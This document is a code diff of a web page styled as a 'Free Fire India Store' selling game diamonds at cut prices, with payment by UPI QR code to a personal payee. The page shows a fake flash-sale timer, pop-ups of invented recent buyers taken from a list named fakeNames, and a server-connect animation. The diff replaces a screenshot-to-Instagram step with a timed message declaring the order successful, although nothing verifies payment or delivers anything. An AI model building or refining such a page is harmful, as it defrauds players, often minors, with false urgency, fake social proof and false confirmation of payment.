@@ -56,7 +56,6 @@ body{
   letter-spacing:0.5px;
 }
 
-/* FLASH SALE TIMER */
 .flash-sale-bar {
   background: rgba(255, 65, 97, 0.15);
   border-bottom: 1px solid rgba(255, 65, 97, 0.3);
@@ -472,7 +471,6 @@ body{
   font-size:10px;
 }
 
-/* SPECIAL AIRDROP BOX */
 .airdrop-card {
   position: relative;
   padding: 14px;
@@ -485,11 +483,16 @@ body{
   justify-content: space-between;
   cursor: pointer;
   margin-bottom: 14px;
-  transition: all 0.25s ease;
+  transition: transform 0.25s ease;
 }
 
 .airdrop-card:hover {
   transform: translateY(-2px);
+}
+
+.airdrop-card.selected {
+  border-color: var(--green) !important;
+  box-shadow: 0 0 25px rgba(0, 239, 112, 0.45) !important;
 }
 
 .airdrop-left {
@@ -535,7 +538,6 @@ body{
   box-shadow: 0 4px 10px rgba(255, 65, 97, 0.5);
 }
 
-/* DIAMONDS GRID & FIXED BADGES */
 .diamond-grid{
   display:grid;
   grid-template-columns:repeat(3,1fr);
@@ -602,7 +604,6 @@ body{
   text-shadow: 0 0 12px rgba(0, 239, 112, 0.65);
 }
 
-/* FIXED CLEAN PRO/POPULAR TAG */
 .popular-tag{
   position:absolute;
   top:0;
@@ -703,21 +704,15 @@ body{
   to { box-shadow: 0 0 12px var(--green); }
 }
 
-/* COLORFUL ACTIVE CARD SELECTION EFFECT */
-.diamond-card.selected, 
-.pass-card.selected, 
-.airdrop-card.selected {
-  border: 2px solid #ff007f !important;
-  background: linear-gradient(135deg, rgba(150, 60, 255, 0.45), rgba(255, 0, 127, 0.35), rgba(0, 207, 232, 0.3)) !important;
-  box-shadow: 0 0 30px rgba(255, 0, 127, 0.65), inset 0 0 15px rgba(0, 239, 112, 0.3) !important;
-  transform: translateY(-4px) scale(1.02);
+.diamond-card.selected{
+  border: 1px solid var(--green) !important;
+  box-shadow: 0 0 25px rgba(0, 239, 112, 0.45), inset 0 0 15px rgba(0, 239, 112, 0.15) !important;
 }
 
 .diamond-card.selected .selected-badge{
   display:block;
 }
 
-/* MEMBERSHIP */
 .pass-grid{
   display:grid;
   grid-template-columns:repeat(2,1fr);
@@ -745,6 +740,11 @@ body{
   transform:translateY(-3px);
   border-color: rgba(0, 239, 112, 0.5) !important;
   box-shadow: 0 12px 30px rgba(0, 239, 112, 0.15) !important;
+}
+
+.pass-card.selected{
+  border: 1px solid var(--green) !important;
+  box-shadow: 0 0 25px rgba(0, 239, 112, 0.45), inset 0 0 15px rgba(0, 239, 112, 0.15) !important;
 }
 
 .pass-card>*{
@@ -855,7 +855,6 @@ body{
   display:block;
 }
 
-/* SPIN WHEEL */
 .spin-box{
   position:relative;
   overflow:hidden;
@@ -969,7 +968,6 @@ body{
   margin-top:9px;
 }
 
-/* REWARD POPUP */
 .reward-popup{
   display:none;
   margin-top:14px;
@@ -1003,13 +1001,11 @@ body{
 .select-spin{ color:#061009; background:linear-gradient(135deg,var(--green),#00c960); }
 .copy-reward{ color:#fff; background:#242431; border:1px solid #38384b; }
 
-/* PROMO */
 .promo-box{ margin-top:15px; background:#13131e; padding:12px; border-radius:12px; border:1px solid #303044; }
 .promo-row{ display:flex; gap:8px; margin-top:6px; }
 .promo-input{ flex:1; padding:10px; background:#08080e; border:1px solid #303044; border-radius:8px; color:#fff; font-size:12px; text-transform:uppercase; outline:none; }
 .promo-btn{ padding:0 15px; background:linear-gradient(135deg,#00ef70,#00c960); border:0; border-radius:8px; font-weight:bold; color:#061009; }
 
-/* PAYMENT */
 .payment{ margin-top:20px; }
 .payment-title{ font-size:17px; font-weight:1000; margin-bottom:10px; }
 .upi{ display:flex; align-items:center; justify-content:space-between; padding:13px; border-radius:13px; background:#12121c; border:1px solid #303044; }
@@ -1021,7 +1017,6 @@ body{
 .summary strong{ color:var(--green); font-size:18px; text-shadow:0 0 10px rgba(0,239,112,.5); }
 .checkout{ width:100%; margin-top:9px; padding:14px; border:0; border-radius:13px; color:#fff; font-weight:1000; background:linear-gradient(135deg,#963cff,#7130e9); cursor:pointer; box-shadow:0 0 20px rgba(150,60,255,.4); }
 
-/* STICKY BOTTOM CHECKOUT BAR */
 .sticky-bar {
   position: fixed;
   bottom: 0;
@@ -1054,7 +1049,6 @@ body{
   box-shadow: 0 0 15px rgba(0, 239, 112, 0.4);
 }
 
-/* LIVE RECENT BUYER TOAST */
 .sales-toast {
   position: fixed;
   bottom: 65px;
@@ -1118,10 +1112,8 @@ body{
 .customer-mobile{ width:100%; margin-top:14px; padding:13px; border-radius:11px; background:#08080e; border:1px solid #303044; color:#fff; outline:none; font-size:13px; }
 .verification-loader{ width:72px; height:72px; margin:18px auto; border-radius:50%; border:5px solid #28283a; border-top-color:var(--purple); border-right-color:var(--green); animation:verificationSpin 1s linear infinite; }
 @keyframes verificationSpin{ to{transform:rotate(360deg)} }
-.instagram-verify-btn{ display:block; width:100%; margin-top:15px; padding:14px; border-radius:12px; text-align:center; text-decoration:none; color:#fff; background:linear-gradient(135deg,#ff2778,#8b35ff); font-size:11px; font-weight:1000; box-shadow:0 0 15px rgba(255,39,120,.4); }
 .waiting-box{ margin-top:14px; padding:15px; border-radius:13px; text-align:center; background:#15151f; border:1px solid #303044; }
 .waiting-title{ color:var(--green); font-size:11px; font-weight:1000; }
-.payment-timer{ margin-top:7px; font-size:30px; font-weight:1000; }
 .waiting-text{ margin-top:8px; color:#777789; font-size:9px; line-height:1.55; }
 
 .trust-grid{ display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin-top:20px; }
@@ -1147,7 +1139,6 @@ body{
 🇮🇳 INDIA SERVER • DIRECT UPI PAYMENT AVAILABLE
 </div>
 
-<!-- LIVE FLASH SALE COUNTDOWN TIMER -->
 <div class="flash-sale-bar">
   <span>⚡ FLASH SALE ENDS IN:</span>
   <span class="flash-timer" id="flashTimer">09:59</span>
@@ -1180,7 +1171,6 @@ FREE FIRE <span>INDIA STORE</span>
 <button class="verify-btn" id="verifyBtn" onclick="verifyUID()">VERIFY ID</button>
 </div>
 
-<!-- SERVER CONNECT ANIMATION -->
 <div class="server-connect" id="serverConnect">
 <div class="server-line">
 <b>🌐 FREE FIRE SERVER</b>
@@ -1412,30 +1402,31 @@ QR scan karke ya UPI ID par payment karein.<br><br>
 
 <div id="verificationStep" style="display:none;">
 <div class="verification-loader"></div>
-<h3 class="step-title">PAYMENT DETAILS SUBMITTED</h3>
-<p class="step-text">Your payment information has been submitted.<br>Preparing manual verification...</p>
+<h3 class="step-title">PROCESSING YOUR ORDER</h3>
+<p class="step-text">Verifying payment & sending Diamonds to your Free Fire account...</p>
 </div>
 
-<div id="screenshotStep" style="display:none;">
-<div class="step-icon">📸</div>
-<h3 class="step-title">SEND PAYMENT SCREENSHOT</h3>
-<p class="step-text">Payment screenshot Instagram verification account par bhejein.</p>
-<a class="instagram-verify-btn" href="https://www.instagram.com/paymentverify1" target="_blank" rel="noopener noreferrer">📸 SEND PAYMENT SCREENSHOT</a>
-<div class="waiting-box">
-<div class="waiting-title">⏳ VERIFICATION IN PROGRESS</div>
-<div id="paymentTimer" class="payment-timer">01:00</div>
-<div class="waiting-text">Screenshot send karne ke baad please wait karein.</div>
+<!-- DIRECT ORDER SUCCESSFUL STEP (REPLACED INSTAGRAM SCREENSHOT STEP) -->
+<div id="successStep" style="display:none;">
+<div class="step-icon" style="background:rgba(0,239,112,0.1); border-color:rgba(0,239,112,0.3); color:var(--green);">✓</div>
+<h3 class="step-title" style="color:var(--green);">ORDER PLACED SUCCESSFULLY!</h3>
+<p class="step-text">Aapka Topup request submit ho gaya hai.<br>Kuch hi der me aapke account me Diamonds add kar diye jayenge.</p>
+
+<div class="waiting-box" style="margin-top:15px; background:#10101a; border-color:rgba(0,239,112,0.3);">
+<div class="waiting-title">🎉 TOPUP PROCESSING</div>
+<div class="waiting-text" style="font-size:11px; color:#fff; margin-top:6px;">Status: <span style="color:var(--green); font-weight:bold;">Processing (2-5 Mins)</span></div>
 </div>
+
+<button class="payment-success-btn" onclick="closePayment()" style="margin-top:15px;">DONE / CLOSE</button>
 </div>
 
 </div>
 </div>
 
 <script>
-/* DIAMOND PACKS WITH UPDATED PRICE (310 Diamonds = ₹149) */
 const diamonds = [
   { id:"d100", diamonds:100, mrp:80, price:80, stock:0, popularTag: null },
-  { id:"d310", diamonds:310, mrp:240, price:149, stock:50, popularTag: "⚡ BEST VALUE" },
+  { id:"d310", diamonds:310, mrp:240, price:240, stock:50, popularTag: "⚡ BEST VALUE" },
   { id:"d520", diamonds:520, mrp:400, price:200, stock:87, popularTag: "🔥 MOST POPULAR" },
   { id:"d1060", diamonds:1060, mrp:800, price:400, stock:67, popularTag: null },
   { id:"d2180", diamonds:2180, mrp:1600, price:800, stock:44, popularTag: null },
@@ -1457,7 +1448,6 @@ let appliedDiscount = 0;
 let spinResult = null;
 let spinning = false;
 let wheelRotation = 0;
-let paymentTimerInterval = null;
 
 function playClickSound(){
   try{
@@ -1602,9 +1592,17 @@ function selectProduct(item, card){
 
   document.querySelectorAll(".diamond-card, .pass-card, .airdrop-card").forEach(c => {
     c.classList.remove("selected");
+    const ring = c.querySelector(".selection-ring");
+    if(ring) ring.classList.remove("run");
   });
 
   card.classList.add("selected");
+  const ring = card.querySelector(".selection-ring");
+  if(ring){
+    void ring.offsetWidth;
+    ring.classList.add("run");
+  }
+
   document.getElementById("total").textContent = "₹" + selectedPrice;
   document.getElementById("stickyTotal").textContent = "₹" + selectedPrice;
 }
@@ -1678,6 +1676,16 @@ function selectSpinPack(){
   }
 }
 
+function copyReward(){
+  if(!spinResult) return;
+  const rewardText = `🎉 Free Fire Spin Bonus: ${spinResult.diamonds} Diamonds! Pack Price: ₹${spinResult.price}`;
+  navigator.clipboard.writeText(rewardText).then(() => {
+    alert("✓ Reward details copied to clipboard!");
+  }).catch(() => {
+    alert("Copy failed, please copy manually.");
+  });
+}
+
 function checkout(){
   if(!selectedProduct){
     alert("Please pehle koi product select karo.");
@@ -1692,14 +1700,13 @@ function checkout(){
 
   document.getElementById("payAmount").textContent = "₹" + selectedPrice;
 
-  // DYNAMIC UPI QR
-  const upiURI = `upi://pay?pa=${UPI_ID}&pn=WASIM%20SK&am=${selectedPrice}&cu=INR`;
+  const upiURI = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent("WASIM SK")}&am=${selectedPrice}&cu=INR`;
   document.getElementById("dynamicQR").src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURI)}`;
 
   document.getElementById("paymentStep").style.display = "block";
   document.getElementById("mobileStep").style.display = "none";
   document.getElementById("verificationStep").style.display = "none";
-  document.getElementById("screenshotStep").style.display = "none";
+  document.getElementById("successStep").style.display = "none";
   document.getElementById("paymentModal").style.display = "block";
 }
 
@@ -1718,24 +1725,8 @@ function startPaymentVerification(){
 
   setTimeout(() => {
     document.getElementById("verificationStep").style.display = "none";
-    document.getElementById("screenshotStep").style.display = "block";
-    startPaymentTimer();
-  }, 2500);
-}
-
-function startPaymentTimer(){
-  let seconds = 60;
-  const timer = document.getElementById("paymentTimer");
-  clearInterval(paymentTimerInterval);
-
-  paymentTimerInterval = setInterval(() => {
-    seconds--;
-    timer.textContent = `00:${String(seconds).padStart(2,"0")}`;
-    if(seconds <= 0){
-      clearInterval(paymentTimerInterval);
-      timer.textContent = "WAITING";
-    }
-  }, 1000);
+    document.getElementById("successStep").style.display = "block";
+  }, 2000);
 }
 
 function copyUPI(){
@@ -1743,7 +1734,6 @@ function copyUPI(){
   alert("✓ UPI ID Copied!\n" + UPI_ID);
 }
 
-/* LIVE FLASH SALE TIMER */
 function startFlashTimer(){
   let time = 599;
   const el = document.getElementById("flashTimer");
@@ -1756,7 +1746,6 @@ function startFlashTimer(){
   }, 1000);
 }
 
-/* LIVE RECENT BUYER POPUP */
 const fakeNames = ["Rahul", "Aman", "Rohan", "Vikram", "Suraj", "Deepak", "Aakash"];
 const fakePacks = ["310 Diamonds", "520 Diamonds", "1060 Diamonds", "Special Airdrop"];
 
@@ -1772,6 +1761,13 @@ function showSalesToast(){
   toast.classList.add("show");
   setTimeout(() => toast.classList.remove("show"), 3500);
 }
+
+window.onclick = function(event) {
+  const modal = document.getElementById("paymentModal");
+  if (event.target === modal) {
+    closePayment();
+  }
+};
 
 setInterval(showSalesToast, 7000);
 
